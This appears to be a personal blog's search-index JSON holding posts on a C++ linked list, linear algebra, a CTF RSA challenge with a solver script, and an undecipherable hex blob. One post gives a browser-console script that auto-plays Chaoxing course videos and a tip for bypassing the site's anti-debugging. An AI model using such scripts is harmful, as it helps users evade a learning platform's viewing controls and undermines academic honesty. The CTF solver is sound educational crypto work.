&#123; delete pHeadNode; pHeadNode = nullptr; &#125; &#125; iterator begin() _T_STD_NOEXCEPT &#123; return iterator(pHeadNode-&gt;Next); &#125; iterator end() _T_STD_NOEXCEPT &#123; return iterator(pHeadNode); &#125; void push_back(const T &amp; value) &#123; insert(end(), value); &#125; void push_front(const T &amp; value) &#123; insert(begin(), value); &#125; void pop_front() &#123; erase(begin()); &#125; void pop_back() &#123; iterator tmp = end(); erase(--tmp); &#125; T &amp; front() &#123; return *begin(); &#125; T &amp; back() &#123; return *(--end()); &#125; unsigned int remove(const T &amp; value) &#123; unsigned int count = 0; iterator itrBegin = begin(); while(itrBegin != end()) &#123; if(*itrBegin == value) &#123; itrBegin = erase(itrBegin); ++count; &#125; else &#123; ++itrBegin; &#125; &#125; return count; &#125; iterator erase(iterator position) &#123; list_node_base* next_node = position.m_smartPtr-&gt;Next; list_node_base* prev_node = position.m_smartPtr-&gt;Prev; prev_node-&gt;Next = next_node; next_node-&gt;Prev = prev_node; delete position.m_smartPtr; position.m_smartPtr = nullptr; if(_size &gt; 0) &#123; _size--; &#125; return iterator(next_node); &#125; iterator insert(iterator position, const T&amp; x) &#123; list_node* tmp = new list_node(); tmp-&gt;dataEntry = x; tmp-&gt;Next = position.m_smartPtr; tmp-&gt;Prev = position.m_smartPtr-&gt;Prev; position.m_smartPtr-&gt;Prev-&gt;Next = tmp; position.m_smartPtr-&gt;Prev = tmp; ++_size; return iterator(tmp); &#125; void clear() &#123; iterator itrBegin = begin(); while(itrBegin != end()) &#123; list_node* tmp = static_cast&lt;list_node *&gt;(itrBegin.m_smartPtr); ++itrBegin; if(tmp) &#123; delete tmp; &#125; &#125; pHeadNode-&gt;Next = pHeadNode; pHeadNode-&gt;Prev = pHeadNode; _size = 0; &#125; int size() // return length &#123; return _size; &#125;private: void empty_init() &#123; pHeadNode = new list_node_base(); pHeadNode-&gt;Next = pHeadNode; // Initialize pointer to itself pHeadNode-&gt;Prev = pHeadNode; _size = 0; &#125;private: list_node_base* pHeadNode; // List head unsigned int _size; // the number of nodes, increase the efficiency of searching&#125;;__MUNDI_END#endif Def.h123456789101112131415#define __MUNDI_BEGIN namespace Mundi &#123;#define __MUNDI_END &#125;#ifndef _T_STD_NOEXCEPT# if __cplusplus &gt;= 201103L# define _T_STD_NOEXCEPT noexcept# define _T_STD_USE_NOEXCEPT noexcept# define _T_STD_THROW(_EXC)# else# define _T_STD_NOEXCEPT# define _T_STD_USE_NOEXCEPT throw()# define _T_STD_THROW(_EXC) throw(_EXC)# endif#endif","categories":[],"tags":[{"name":"C++","slug":"C","permalink":"https://mundi-xu.github.io/tags/C/"},{"name":"list","slug":"list","permalink":"https://mundi-xu.github.io/tags/list/"}]},{"title":"超星学习通开启自动播放模式","slug":"学习通自动播放模式","date":"2019-08-21T03:11:00.000Z","updated":"2020-12-23T15:57:57.650Z","comments":true,"path":"2019/08/21/学习通自动播放模式/","link":"","permalink":"https://mundi-xu.github.io/2019/08/21/%E5%AD%A6%E4%B9%A0%E9%80%9A%E8%87%AA%E5%8A%A8%E6%92%AD%E6%94%BE%E6%A8%A1%E5%BC%8F/","excerpt":"为便于观看超星学习通课程视频，提高学习效率，特推出自动播放模式，仅供交流学习。","text":"In three words I can sum up everything I’ve learned about life: it goes on.几个字足以概括我学到的人生：一切都在继续。 1234567891011121314151617181920212223242526272829303132333435363738394041424344var fa = $(&quot;body&quot;);var btn = $(&quot;&lt;li&gt;&lt;/li&gt;&quot;);var json = &#123; &quot;background&quot;: &quot;#66ccff&quot;, &quot;height&quot;: &quot;16px&quot;, &quot;padding&quot;: &quot;5px&quot;, &quot;z-index&quot;: 0xFFFFF, &quot;cursor&quot;: &quot;pointer&quot;, &quot;top&quot;: &quot;300px&quot;, &quot;right&quot;: &quot;120px&quot;, &quot;position&quot;: &quot;fixed&quot;&#125;;btn.css(json);btn.html(&quot;&lt;span id=&#x27;lfsenior&#x27;&gt;开启自动播放模式&lt;/span&gt;&quot;);fa.append(btn); btn.click(function () &#123; setInterval(function () &#123; //获取iframe var video = $(&quot;iframe&quot;).contents().find(&quot;iframe&quot;).contents(); //播放函数 var play = function () &#123; video.find(&quot;#video &gt; button&quot;).click(); var jy = video.find(&quot;#video &gt; div.vjs-control-bar &gt; div.vjs-volume-panel.vjs-control.vjs-volume-panel-vertical &gt; button&quot;); if (jy.attr(&quot;title&quot;) != &quot;取消静音&quot;) &#123; jy.click() &#125; &#125; //如果正在加载 var load = video.find(&quot;#loading&quot;); if (load.css(&quot;visibility&quot;) != &quot;hidden&quot;) &#123; return; &#125; //获取当前进度 var spans = video.find(&quot;#video &gt; div.vjs-control-bar &gt; div.vjs-progress-control.vjs-control &gt; div&quot;).attr(&quot;aria-valuenow&quot;); // 如果还没播放完 if (spans != 100) &#123; play(); &#125; $(&quot;#lfsenior&quot;).html(&quot;自动模式已开启,本章进度:&quot; + spans + &quot;%&quot;); &#125;, 100); &#125;); 以Chrome为例，按F12打开Console，复制代码回车即可。 2019-10-18更新目前部分课程网站添加了前端反调试，表现为页面不断debugger，Chrome只需Ctrl + F8禁止断点即可。","categories":[],"tags":[{"name":"something useful","slug":"something-useful","permalink":"https://mundi-xu.github.io/tags/something-useful/"},{"name":"超星学习通","slug":"超星学习通","permalink":"https://mundi-xu.github.io/tags/%E8%B6%85%E6%98%9F%E5%AD%A6%E4%B9%A0%E9%80%9A/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://mundi-xu.github.io/tags/JavaScript/"}]},{"title":"线性代数的本质（更新中）","slug":"线性代数的本质","date":"2019-06-30T08:21:00.000Z","updated":"2021-03-11T08:12:59.460Z","comments":true,"path":"2019/06/30/线性代数的本质/","link":"","permalink":"https://mundi-xu.github.io/2019/06/30/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%9A%84%E6%9C%AC%E8%B4%A8/","excerpt":"将只停留在数值运算和公式的线性代数与可视化几何结合，整理自3Blue1Brown的系列视频。","text":"序言 There is hardly any theory which is more elementary than linear algebra, in spite of the fact that generations of professors and textbook writers have obscured its simplicity by preposterous calculations with matrices.尽管一批教授和教科书作者用关于矩阵的荒谬计算掩盖了线性代数的简明性，但鲜有比之更基本的理论。 将只停留在数值运算和公式的线性代数与可视化几何直观（Visual Geometric Intuition）结合，整理自3Blue1Brown的系列视频。内容涉及到向量，线性变换，行列式，逆矩阵，点积与叉积，特征向量与特征值等，以及二次型，相似矩阵等补充内容。 我们为什么需要几何直观在开始之前，想象学习一个事物（概念）的场景：我们需要学习正弦函数 $\\sin (x)$ ，非常不幸的是，你遇到的教材告诉你，正弦函数是这样的： $\\sin (x) = x - \\frac{x^3}{3!} + \\frac{x^5}{5!} + \\cdots + (-1)^n\\frac{x^{2n+1}}{(2n+1)!} + \\cdots$ 看上去很厉害的样子，并且计算机也的确是这么计算 $\\sin (x)$ 的，而对你来说，计算$\\sin (\\frac{\\pi}{6})$可能就是把 $x= \\frac{\\pi}{6}$ 代入公式，然后神奇的发现结果越算越接近0.5 ，此时你对$\\sin (x)$与三角形之间的几何直观只有一些模糊的概念，这样的学习就十分悲催了。为什么呢？再假设一个场景：在学完$\\sin (x)$函数后，你又去参加了一个物理课程，正弦函数随处可见，其他人很快就能知道如何使用它并能得出大概值，而刚学完正弦函数的你内心戏大概是这样的：这群学物理的脑子也太强了！ 其实，你需要只是一个几何直观的灌输而已，这也从侧面佐证了一个好的老师或教材（这里的好老师真的不是他本身的学术能力有多强，而在于他擅不擅长站在学习者的角度不断的修正教学方法）是有多么重要。 教学不同层次的人：初学、入门、掌握、理解，解释的角度，方式都完全不同。更加不幸的是，为了能更加通用的用理论来描述现实生活中的规律，人类已经做了很多工作，我们常说：越通用，越抽象，这对于初学者来说堪称一段噩梦。 上述例子可能比较极端，但只为强调一件事：直观理解很重要，或者说，学习方法很重要。好的学习方法即你如何直观的去理解（可能是几何的，或是现实中的具体例子）一个抽象的事物，并层次化的建立知识与知识间的联系，构建并健壮属于自己的知识图谱。个人观点是，这种学习方法是最高效的。它唯一的要求在于，需要一定的基础知识打底，一定的量变结合方法论（点拨或领悟）就是质变。 向量究竟是什么 The introduction of numbers as coordinates is an act of violence.引入一些数作为坐标是一种鲁莽的行为。 不同视角下的向量对于向量的这个概念，大家一定并不陌生，但是这次让我们从数学，物理，计算机三个角度来看待如何定义这个向量这个概念。 物理专业角度 向量是空间中的箭头 决定一个向量的是：它的长度和它所指的方向 计算机专业角度 向量是有序的数字列表 向量不过是“列表”一个花哨的说法 向量的维度等于“列表”的长度 数学专业角度对数学来说，它的本质就是通用和抽象，所以，数学家希望概括这两种观点: 向量可以是任何东西，只需要保证：两个向量相加及数字与向量相乘有意义 向量加法和向量乘法贯穿线性代数始终，十分重要 可以通过上图直观的感受到数学家在想什么。左边是物理角度，右边是计算机角度，但是很抱歉，我能用一些抽象的定义和约束让你们变成一个东西。 坐标系把向量置于坐标系中，以原点为起点，坐标正负表示方向，可完美把两个不同的角度融合。 向量加法 物理：首尾相连 (Motion) 计算机：坐标相加 向量乘法 物理：缩放 (Scaling) 计算机：坐标和比例相乘 实际上无论你怎么看待向量都无所谓，或把向量看作空间中的箭头，或把向量看作数字列表，线性代数的效用很少体现在这些观点中的其中一个上，而是更多的体现在它能够在这些观点中互相转化。线性代数为数据分析提供了一条将大量数据列表概念化、可视化的渠道，它能让数据样式变得非常明晰，并让你大致了解其特定运算的意义。同时，线性代数给物理学家和计算机图形程序员提供了一种方法去通过计算机能处理的数字来描述并操纵空间（例如Mathematical Animation Engine)。 线性组合、基与其张成的空间 Mathematics requires a small dose, not of genius, but of an imaginative freedom which, in a larger dose, would be insanity.数学需要的不是天赋，而是少量的自由想象，但想象太过自由又会陷入疯狂。 本部分继续加深一个概念，为何向量加法与向量乘法是那么重要，并从始至终贯穿整个线性代数（关于后面的直观解释部分，强烈建议去原视频观看动画演示）。 线性组合二维空间中任意两个不共线的非零向量都可以表示该空间中的任意一个向量，写成符号语言就是： $a \\mathbf{\\vec v} + b \\mathbf{\\vec w}$ 。 至于为什么被称为“线性”，有一种几何直观：如果你固定其中一个标量，让另一个标量自由变化，所产生的向量终点会描出一条直线。（这里其实很不严谨，具体定义请参阅课本。） 空间的基 (Basis)对于我们常见的笛卡尔坐标系，有一组最直观的基：${ \\hat{\\imath},{\\hat{\\jmath}} }$，即单位向量 $\\hat{\\imath}=(1,0)$ 和 $\\hat{\\jmath}=(0,1)$,通过$\\hat{\\imath}$和${\\hat{\\jmath}}$的拉伸与相加可以组成笛卡尔坐标系中的任意一个向量。（上述的任意两个不共线的非零向量也可以作为二维空间的一组基。） 张成的空间 (Span)同理，我们可以选择不同的基向量，而这些基向量构成的空间就称为其张成的空间。张成二字比较拗口，可以类比为延伸或扩展。直观来看，就是本文所有图中的网格。笛卡尔坐标系就是一个由单位坐标${ \\hat{\\imath},{\\hat{\\jmath}} }$张成的空间（同时也是上述任意两个不共线的非零向量所张成的空间）。所有可以表示为给定向量（基）线性组合（刚刚讲了这个概念）的向量的集合，被称为给定向量（基）张成的空间。 如果你继续思考一下，会发现一个特点：**并不是每一组给定向量都可以张成一个空间**，若这两个向量共线（2D），共面（3D），它们就只能被限制在一个直线或面中，类似于“降维打击”（这也是我强调不共线且向量非零的原因）。通过这个直观的思考可以引出以下概念： 线性相关关于什么是线性相关，有两种表达： 你有多个向量，并且可以移除其中一个而不减小张成的空间（即2D共线或3D共面），我们称它们（这些向量）线性相关。 其中一个向量，可以表示为其他向量的线性组合，因为这个向量已经落在其他向量张成的空间之中。 从统计学角度来说，就是指这些向量之中有冗余。即在这一堆向量中，我们只需要其中几个（取决于维度）就可以表示所有其他的向量。由此，我们可以得出以下部分： 向量空间中一组基的严格定义向量空间的一组基是张成该空间的一个线性无关向量集。 在线性代数中，基(basis)（也称为基底）是描述、刻画向量空间的基本工具。向量空间的基是它的一个特殊的子集，基的元素称为基向量。向量空间中任意一个元素，都可以唯一地表示成基向量的线性组合。如果基中元素个数有限，就称向量空间为有限维向量空间，将元素的个数称作向量空间的维数。 使用基底可以便利地描述向量空间。 用这样的步骤来慢慢导出这个定义，个人感觉，远比在课堂的第一分钟就将这句让你迷惑的话丢给你好的多，抽象的东西只有在慢慢推倒中你才能发现它的精巧之处，非常优雅且迷人。 矩阵与线性变换 Unfortunately, no one can be told what the Matrix is. You have to see it for yourself.很遗憾，矩阵是什么是说不清的。你必须得自己亲眼看看。 矩阵，最直观的理解当然是一个写成方阵的数字 $\\begin{pmatrix}1&amp;0 \\\\ 0&amp;1 \\end{pmatrix}$，这几节的核心是为了说明：矩阵其实就是一种向量变换（至于什么是变换下面会讲），并附带一种不用死记硬背的考虑矩阵向量乘法的方法。 变换变换本质上是函数（下左图）的一种花哨的说法，它接受输入内容，并输出对应结果，特别的，在矩阵变换（下右图）中，我们接受一个向量并且输出另一个向量。 那既然变换和函数意义相同，为什么要用多余的术语困惑我们呢？因为使用变换是在暗示以特定方式来可视化这一输入$\\to$输出关系。一种理解“向量的函数”的方法就是就是使用运动。 这世界上有非常多优美的变换，如果你将他们可视化，就能得到下图： 线性变换我们说具有以下两个性质的就是线性变换（直观可视化如下图）： 直线在变换后仍然保持为直线，不能有所弯曲。 原点必须保持固定 用一句话总结就是：线性变换是保持网格线平行且等距分布的变换（如果变换后保持直线不变但原点改变则为仿射变换，即线性变换+平移）。 如何用数值描述线性变换这里需要使用上一节提到的工具，空间的基，也就是单位向量（基向量）：$\\hat{\\imath}=(1,0)$ 和 $\\hat{\\jmath}=(0,1)$ 对线性变换，我们只需要关注两个基向量 $\\hat{\\imath}$ 和 $\\hat{\\jmath}$变换后的位置即可。例如，$\\hat{\\imath}$ 变换到$(3,1)$的位置，$\\hat{\\jmath}$ 变换到$(1,2)$的位置,将$\\hat{\\imath}$变换后的坐标竖起来作为方阵的第一列（绿色表示），$\\hat{\\jmath}$变换后的坐标竖起来作为方阵的第二列（红色表示），得到矩阵$\\begin{pmatrix}\\color{green}3&amp;\\color{red}1 \\\\ \\color{green}1&amp;\\color{red}2 \\end{pmatrix}$。假设我们想要知道目标向量$(-1,2)$进行变换后的位置，那么这个矩阵就是对变换过程最好的描述，一图胜千言。 Step1： 绿色$\\hat{\\imath}$（x轴）进行移动（变换） Step2： 红色$\\hat{\\jmath}$（y轴）进行移动（变换） Step3： 目标向量x轴坐标值与$\\hat{\\imath}$变换后向量进行向量乘法 Step4： 目标向量y轴坐标值与$\\hat{\\jmath}$变换后向量进行向量乘法 Step5： 两者进行向量加法，得到线性变换结果 更加一般的情况，我们用变量来代替其中的具体值，其中绿色代表$\\hat{\\imath}$变换后的向量，红色代表$\\hat{\\jmath}$变换后的向量： $\\begin{pmatrix}\\color{green}a&amp;\\color{red}b \\\\ \\color{green}c&amp;\\color{red}d \\end{pmatrix}\\begin{pmatrix} x \\\\ y\\end{pmatrix} = \\underbrace{x \\begin{pmatrix}\\color{green}a \\\\ \\color{green}c \\end{pmatrix} + y \\begin{pmatrix} \\color{red}b \\\\ \\color{red}d \\end{pmatrix}}_{\\text{直观的部分这里}} = \\begin{pmatrix}\\color{green}{a}\\color{black}{x}+\\color{red}{b}\\color{black}{y} \\\\ \\color{green}{c}\\color{black}{x}+\\color{red}{d}\\color{black}{y}\\end{pmatrix}$ 上面的公式就是我们常说的矩阵乘法公式，现在，不要强行背诵，结合可视化的直观动图，你一辈子都不会忘记的。 线性的严格定义在给出一个数学化抽象的解释前，先做一下总结： 线性变换是操纵空间的一种手段，它保持网格线平行且等距分布，并保持原点不动 矩阵是描述这种变换的一组数字，或者说一种描述线性变换的语言 在数学上，线性的严格定义如下述公式，这些性质，会在之后进行讨论，也可以在这里就进行一些思考，为什么说向量加法和向量乘法贯穿线性代数始终？ $L(\\mathbf {\\vec v} + \\mathbf{\\vec w}) = L(\\mathbf {\\vec v}) + L(\\mathbf {\\vec w}) \\qquad 可加性（对加法封闭）$$L(c \\mathbf {\\vec v}) = c L(\\mathbf {\\vec v}) \\qquad 成比例（对数乘封闭）$ 矩阵乘法与线性变换复合 It is my experience that proofs involving matrices can be shortened by 50% if one throws the matrices out.据我的经验，如果丢掉矩阵的话，那些涉及矩阵的证明可以缩短一半。 复合变换如果对一个向量先进行一次旋转变换，再进行一次剪切变换( $\\hat {\\imath}$保持$(1,0)$不变, $\\hat{\\jmath}$移动到坐标$(1,1)$),如下图所示： 那么如果通过旋转矩阵和剪切矩阵来求得这个符合矩阵呢？为了解决这个问题，我们定义这个过程叫做**矩阵的乘法**。 矩阵乘法的计算在这里我们发现，矩阵乘法的变换顺序是从右往左读的（这一个常识很重要，你得明白这一点，有基本概念），也和我们熟知的复合函数形式 $f(g(x))$ 是一致的。 那么如何求解矩阵乘法呢？对线性代数有印象的同学现在能马上记起来那个稍显复杂的公式吗？如果有些忘记了，那么，现在，就有一个一辈子也忘不了的直观解释方法： 如图，$M_1$矩阵的第一列表示的是$\\hat{\\imath}$变换的位置，先把它拿出来，$M_2$矩阵看成对这个变换过的$\\hat{\\imath}$进行一次变换（按照前文的规则）。同理，针对$\\hat{\\jmath}$做一样的操作，就可以得出这个表达式。 矩阵乘法的运算规律通常学生在学习矩阵乘法时都会记住上述公式并通过一些特定的运算加强记忆（包括我），但是在记忆这个过程前，我希望你能养成思考矩阵乘法意义的习惯，也就是两个变换相继作用。这能形成一个更好的概念性框架，并让你更容易理解矩阵乘积的性质。举个栗子，矩阵相乘时，它们的先后顺序影响结果吗？有了上面的想法，可以自己试着在不进行计算的条件下思考一下，然后再尝试证明结合律与分配律是否成立。你会发现，原来线性代数是这么的直观，完全不需要计算。 未完待续……","categories":[],"tags":[{"name":"线性代数","slug":"线性代数","permalink":"https://mundi-xu.github.io/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"}]},{"title":"一种神奇的rsa加密算法","slug":"一种神奇的rsa加密算法","date":"2018-11-29T07:21:00.000Z","updated":"2020-12-23T11:58:41.661Z","comments":true,"path":"2018/11/29/一种神奇的rsa加密算法/","link":"","permalink":"https://mundi-xu.github.io/2018/11/29/%E4%B8%80%E7%A7%8D%E7%A5%9E%E5%A5%87%E7%9A%84rsa%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/","excerpt":"新的算法并没有透露 n，只给定了两个大整数：(p*q)^(p+q) 和 (p*q)^(p-q)，其中 ^ 是按位异或运算。","text":"新的算法并没有透露 n，只给定了两个大整数：(p*q)^(p+q) 和 (p*q)^(p-q)，其中 ^ 是按位异或运算。 12345678910111213import sympyp = sympy.randprime(2 ** 1023, 2 ** 1024)q = sympy.randprime(2 ** 1023, 2 ** 1024)a = (p * q) ^ (p + q)b = (p * q) ^ (p - q)flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()m = int.from_bytes(flag, &#x27;big&#x27;)print(a, b, pow(m, 65537, p * q)) 2018年12月20日更新我们定义 $ f_1(x,y) = (x \\ast y)^{(x+y)} 和 f_2(x,y) = (x \\ast y)^{(x-y)} $ ，我们发现这两个函数都有一个共同的性质，就是函数值的最低 n 个二进制位只和 x、y 的最低 n 个二进制位有关。也就是说，我们可以用 a 和 b 的最低 n 位来判断 p 和 q 的最低 n 位是否可能正确。如果它们的最低 n 位满足 $ f_1 $和 $f_2$ 函数，那么它们就是 p 和 q 低位的候选答案；如果不满足，它们就根本不可能是真正 p 和 q 的低位。所以我们可以从一个二进制位（n=1）开始，每次增加一位。每增加一位时，我们把原来满足条件的 p 和 q 低位的每种可能情况分别在前面加上 0 或 1，这样每种情况就变成了 4 种新的情况，然后对所有新的情况用 $ f_1 $ 和 $ f_2 $ 函数提供的约束条件进行过滤，只保留满足条件的情况。当跑到 1024 位的时候，就只会剩下真正满足条件的 p 和 q 了。然后，我们根据 RSA 的原理，在 mod (p-1)*(q-1) 的意义下对 e 求逆元，得到私钥 d，计算 pow(c, d, p*q)即可得到 flag 的大整数表示。 求解脚本如下 1234567891011121314151617181920212223242526272829303132import gmpy2a, b, c = [int(s) for s in open(&#x27;output.txt&#x27;).read().split()]#假设已将加密内容保存到 output.txt 文件中f1 = lambda p, q: (p * q) ^ (p + q)f2 = lambda p, q: (p * q) ^ (p - q)candidates = &#123;(0, 0)&#125;for m in range(1025): print(m, len(candidates)) candidates_ = set() mask = (2 &lt;&lt; m) - 1 for x, y in candidates: if f1(x, y) == a and f2(x, y) == b: p, q = x, y d = gmpy2.invert(65537, (p - 1) * (q - 1)) m = pow(c, d, p * q) print(bytes.fromhex(hex(m)[2:])) exit() for bx in range(2): for by in range(2): xx = x + (bx &lt;&lt; m) yy = y + (by &lt;&lt; m) if f1(xx, yy) &amp; mask != a &amp; mask: continue if f2(xx, yy) &amp; mask != b &amp; mask: continue candidates_.add((xx, yy))candidates = candidates_ 有几个人做出来了呢（坏笑:） [^1]hackergame2018-RSA_of_Z","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://mundi-xu.github.io/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"https://mundi-xu.github.io/tags/crypto/"},{"name":"rsa","slug":"rsa","permalink":"https://mundi-xu.github.io/tags/rsa/"}]},{"title":"Hello World","slug":"hello-world","date":"2018-10-25T09:21:30.000Z","updated":"2021-01-26T12:55:23.201Z","comments":true,"path":"2018/10/25/hello-world/","link":"","permalink":"https://mundi-xu.github.io/2018/10/25/hello-world/","excerpt":"Welcome to My Blog !","text":"Welcome to My Blog ! This is my first postYou can see the about me hereThank you for following","categories":[],"tags":[]},{"title":"something useful","slug":"something useful","date":"2000-10-29T16:05:21.000Z","updated":"2021-02-08T13:29:03.081Z","comments":false,"path":"2000/10/30/something useful/","link":"","permalink":"https://mundi-xu.github.io/2000/10/30/something%20useful/","excerpt":"杂七杂八的还没整理，没啥东西","text":"c67ac6a6455f55f46a68c80a411e05f43dffda445700600862eb8aad928a63aea86778ac20511c3e92deefda33f6654f915d301d5d3d7ba2ef02fed867d533de303536e2ca1ffc77af6d705d9944023b2b729f23254b7dbc5e7395940f51ed191ce8c349af0763aa85db62e319fab8c25eb97aebe3060fc92ce486f90d2e0e6a921c769c11774816d9a47d7f6c5f6f679d8db9ee1f1c46afe399675f40dd173e6ed55f1466203373f60f404813b76fbd0edd96f69392e2ce6f4c7913d637cea12f43ef574bc96d2b2db0d3dc8129782d7138b5916ae93d1a895d36ba1db5e888ba54d6795f8a4106fd2dc9256ee0a25641c588e0e96b3c8cff2c1cae4f328db12ea5b0fc5c115439111501931141cf3f59472d8a32f77ff3051a34c98502cbad568458ac15a1e576352dff66a3bdb230b947ae2dec93977903cbf0e99d8ab1976d0ddbdeea3958f4189ffb6b29ebc98235856dae1dff347cf02a1ab9c4138569bdded893e5eb5d335e6f1a946947b4eebe29599b5087ac9e7a1bd32bd4b1f9e13ec970e3f39204f366b2bb92ee6b40754064d983750f93dd87550096d206e64a4557a70b8d37b7f7c6415d580eb82cbb9fcbf436cc991829075a10dc217e545fb7bf14ab8b38f3d3e6caaa82d8b1a1583b4ba43d66e63bd5748acfd1077e472d92bc2a09c144734b548469af73562c385ee062fb3405fdc78a5fa79b6e58788423d7fd76837636cddcbdafc25fefc00dc8d4f7ff01855a883268fa864ffd04ed7fe9032dc27bbbcc3c52500bf114c6cde119d53a596485788485e9bae7e5c9d08b683d67c002991c310a811bb3095c501dff98b65f036cfd90d9a95e5bb3084d8375f580e35acac8373085d28d911dceea57c46ca54249c88ea4205648fa66e6c8af20192d86d51f585f01acfd1fb107360e83a504862e6c403811e9688cf8d8b46d4d3f8551d1b3c6d79737d4b68ce6ef15566f52ecbd71b8bcafe51dfb24aa4333d3508605b8c943ae23c6949544d17b4a4a4a87b50ddaf708915539cd41b3c83be10a75246e3f379743cc958c601c3af42ff566425bdf40af6c61ad75f9010b522fae991a825293e7ba6c863d064e3b94f527637f7368e9129cc81edd7f4f45d1f58d70cb7aaab59ed0c7ed76c36507984e6e96823dac312246c129d8c9bdb23621ec10f1d848226df05d3295949e28d948c464af83335e93e16ef9f31a2e21ef2f5d35b1b247390746b7668b97470211742345b3787c1ee4d18ec14d0df97dde46ae96ca726f724b7bad4eeccc83574ba6ee25a6123f7fd18b92ab67d4585fe02c0aafba8a0e1fa7f84ca93173e2d2639a2193425e9db4e2a2ef0ddb85701b5bfb4b31f649600a75e28bcf0b83e29bbde1381524a5ddd9258c9ed6dee1743d15f1b8a879ede75b62f3153d87daf6c0795c9237bee597865eacf5c58a0eb7752beb5a98a829000ee245cbcf3332869e6e4b8b76e414b4c183fe7975025f0c9238b1b4d0f943083d561156249a93938f2cb526c7950781c65bfc690f2dac8519161491ddfc880edb7add70e32c08cdebae586e570d34466946522f3b6c487a84157a3f462c2b568b5531e4a85db4040ee206bd054679bfe45717fe78ec73df62cab430b5abd6417b4891d8d22f5c54c437c78bcc362a8573876b6e9758e9c25e31bd7ed5a42878a44c8ea90b09651f284e79705754585e5eb834f5a90e606b9b23b6a15e515fb978e17b27740f2669f95643993daf306664eea908ab55d6820393c870fc806bdbc3f54a6f59ce8fb0df2be08ac79ff3cc6e9e25e572b678b229753b54c32c462c6f1afdf5d0dc695b590b4676ff5c88b1e60f228d8b515a9b0b00b33c2e28abd0cc3f6958df3ff1b945f7242e9f4cd3d1b2a8bafde9f9ce868dae9e0f51dc6902e0e26c7b7746f4b1dc911ebd4c912bbbcead1da9b1058fcb8b3658bf91eaed14e6cd9f4c176ff516606937e0dae98bc5666d4b2f20084b19f4c3ef9e46c2b09d55ad535e5a40d93632520630f3deccc19784615f19e18521ea65f6903820d510d9fd64e746308d2f6346240eca486cf045809654ffd36fcf872c681935530075d33a563ad8369ba13e01f053caf0ce0dc7412c5ccf9c6b2d6191a930df3c171c0e280f05ff79fbf49b23dd76e5e851d27fbe1ae51c251d3c85db6c5e1ab326a89d5f3d997db4f5a565d72c7a5ed572bfff814eba8f155b2f246ea68213923d98421af4f8303d517b072d869dea5ec7e9792be2571ced769221c607ffdcc3d969284588dd4454adce24cad363454a9c772106056096afc93504ce0a72ad1b1c106d90dce084d66621ece839bf2a278661b29c94f28fcfb20c9e50383fa114a91b403af025422c377358a5198e9004c08ae336e93df1247e47bd5e3cf7b17d1accbba2368083de2b91da0075223a2c6c7183f7966f353674d42fa1a3f29ca765c1be21c2f49fc4e17204a0035c26d744af8809945ab3f666c83dee835c60d04a40da5f0c36d0d14c6949bb77fe0cfe47c9e80abfd2669eada9b9e1a20004c5a4b2f60fd824b480f04eca703e85e1bd15e732fa80ff2619765438490eab3bf54b20b63df76ebfdb4e2c3037ddd09c0df036f185b4652bb6c85cbd20c359e42c309b27279c06d17cdada086fcd813b55161f062af5b8fd35d88f67fbf16e8d1a6930a20e9614419cbda13f05f56de42b4a621c43c00d57985a316b079f3eac491dd25769af8250bc583a20642bf1c1b08bf484bda59408d4014bc7ada1681d8021e04ffc3a3ce84a9b3e58b87592c5f0e034434fe74bb3964400fadc25a955a240ab324fb3b65275401f9c17df51d4561fbcd7034c8930a584fe1298c755c5f43268faae0153caabf1fc41e6b154bb96ab7cf2eff81407580e3ee031a6239991ce0ee069cb83b1715e923b3f40eac90b266a6ada3e75a0d1bc8a05c7f9c376c57ead334891929387b7ad3671602b116a72499fc3232cd3181fa185a3b6af368f691bf35ad0934ec83d44b9db4e7376ba78112cba6c6400a94c641d47fabcdc45a7c140f67f2e5936edaa6be519389f4e556455cb2b17d55deca3334c19fe51f612ae62d3d217edd35a5bfc00de3bbd3dc44634f5171ab7a9145256aca30791a7e2ae80c135a5465cbe074e42e03c032756b55e6fc4282d6fd9739444e3dad94287750a5b62a525b97f5edfa44144d98c8ccd104f42336534a3e5328e602cfc36cf3ab9b811900ac881edff8b434f9b8eca28852caa8d2589b6fb993b8984b3e9ad2afcd158dbe4608e25585a6e50f561e4586247fd422ad5e88406072860ef2eb088a7e643444100bdf04fda6a8a166dc198b660150decf9f3379bd55c78bf415edb246d13b4e62a73d96fffe0a57230316f81fae89c4324e7be257a19e146960ed28cdc32f468ed2eea4783081b34ff9046cfd2ef96132863776c78b6ed5ae6aa99a4ecec19d392d72b3a64cc7f10ccb8e62df1925e1251dcafa325a5fc49be470d2264bd963313aa750bd66401a7b7740d0b1b45c6481f903d1ea3f271344d54238e96ea9d8aa733dc950a200a9ae4b04c80b06c1d7973cecb58881c88dd28fa291d911306a1b4c1afa8b1fca8fd387cf4abc83bdbab02cf0797745912ecd820aa9657846e39f089d2fd5be7d94574653a4602c6f6affbe2ec41b1fe46f7fe0c39e2ddc6b31ee3d0d3938ca75631fc01227eb91a4f4a079c66e7b377b4add4c2608c08d530b2925e88a9f485294d5005736a948710424e1ccc31e007d2814a62a09dc14c86e17b14d0442feb0166aa7695e6e2430f838eaa178a994b3eced266554d79905f9388e79b1c604f2b004feac5fd7563201cc05535fa2ba7cf02b9a7a0d9ffdd5cd75e5c57706b3db1e131c6bdf88ecb69f19ff2bbe279d833c9f4c7a0e6260f148316be5b2ea267aad17588755adad69e906ad5193d8bc6b844c531e596bbb4bb341c6e5b1103a0af929bec37e1628afdfa09c04a9ac017e54a41aaa54998ca43093ceb5d251a328840133a4dc939d2c743ab068ea7b9291d60c32bb88e988432afbfcb956425977d65181b0214f215dd18121c8677f604183d74af09ba276ff9725cdc00d61a06741d6966c727176be8e6289450ad8babdbea77d4408875b6c2a0268bd6d968d878389a4899aa629c403fd74ebb523770032c22587a3e0f8e92ad6501d8c00633057f0d6652f04b3f09a9df5774b49d5ad0787c2d976c338393ae964405e1c6d4ed5c6f8e7f8fa45a406614e134895ec8132c22fef19a45505cd452e6415d3a70fc796dac5ed16879edbee178e15e0d75518a193d964344ec81d9411e74c3342ed50c3e4b79c60f08e7284f879dc2beb4442b09ddc7b788859548f759372a36cd7c0c4e9ea0ab3e9c498b9b2aaee8c72579c5c19fb43478dc132fdee3d5a252c9ff244c5dfdc2f25df